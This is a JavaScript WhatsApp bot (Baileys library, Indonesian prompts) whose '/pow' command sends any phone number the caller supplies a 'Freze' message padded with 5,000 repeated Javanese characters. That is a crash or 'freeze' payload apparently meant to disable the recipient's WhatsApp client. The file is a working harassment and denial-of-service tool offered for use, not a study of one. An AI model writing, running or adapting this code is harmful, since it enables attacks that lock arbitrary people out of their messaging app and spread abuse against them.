import makeWASocket, { useMultiFileAuthState, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, DisconnectReason } from '@whiskeysockets/baileys'
import { Boom } from '@hapi/boom'
import pino from 'pino'

const startBot = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info')
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        }
    })

    sock.ev.on('creds.update', saveCreds)

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0]
        if (!m.message || m.key.fromMe) return
        const from = m.key.remoteJid
        const msgText = m.message?.conversation || m.message?.extendedTextMessage?.text || ''

        if (msgText.startsWith('/menu')) {
            await sock.sendMessage(from, {
                text: "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗣𝗥𝗢𝗝𝗘𝗖𝗧 𝟬𝟭\nSend /pow 62xxx"
            })
        }

        if (msgText.startsWith('/pow')) {
            const target = msgText.split(' ')[1]
            if (!target || !/^\d{10,15}$/.test(target)) {
                await sock.sendMessage(from, { text: 'Format salah. Contoh: /pow 6281234567890' })
                return
            }

            const spamText = `𝘍 𝘳 𝘦 𝘻 𝘦\n` + 'ꦾ'.repeat(5000)

            await sock.sendMessage(`${target}@s.whatsapp.net`, {
                text: spamText
            })

            await sock.sendMessage(from, {
                text: `Pesan telah dikirim ke ${target}`
            })
        }
    })

    sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            if (reason === DisconnectReason.loggedOut) {
                console.log('Logged out, please re-authenticate.')
                process.exit()
            } else {
                startBot()
            }
        }
    })
}

startBot()
